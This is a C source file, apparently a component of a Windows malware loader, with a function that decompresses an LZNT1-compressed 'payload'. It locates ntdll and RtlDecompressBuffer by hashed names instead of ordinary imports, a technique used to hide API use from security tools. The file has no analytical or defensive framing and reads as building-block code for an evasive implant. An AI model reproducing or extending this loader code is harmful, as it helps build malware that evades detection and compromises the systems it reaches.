#include "Decompress.h"
#include "Structs.h"
#include "ApiResolve.h"

#ifndef COMPRESSION_FORMAT_LZNT1
#define COMPRESSION_FORMAT_LZNT1 0x0002
#endif

BOOL DecompressPayload(
    const BYTE* pCompressed,
    DWORD       dwCompressedSize,
    DWORD       dwOriginalSize,
    BYTE**      ppDecompressed,
    DWORD*      pdwDecompressedSize
) {
    HMODULE hNtdll = GetModuleByHash(HASH_NTDLL);
    if (!hNtdll) return FALSE;

    #define HASH_RtlDecompressBuffer 0xF73BBD46

    fnRtlDecompressBuffer pDecompress = (fnRtlDecompressBuffer)
        GetProcByHash(hNtdll, HASH_RtlDecompressBuffer);
    if (!pDecompress) return FALSE;

    BYTE* pOutput = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwOriginalSize);
    if (!pOutput) return FALSE;

    ULONG ulFinalSize = 0;
    NTSTATUS status = pDecompress(
        COMPRESSION_FORMAT_LZNT1,
        pOutput,
        dwOriginalSize,
        (PUCHAR)pCompressed,
        dwCompressedSize,
        &ulFinalSize
    );

    if (!NT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pOutput);
        return FALSE;
    }

    *ppDecompressed     = pOutput;
    *pdwDecompressedSize = ulFinalSize;
    return TRUE;
}
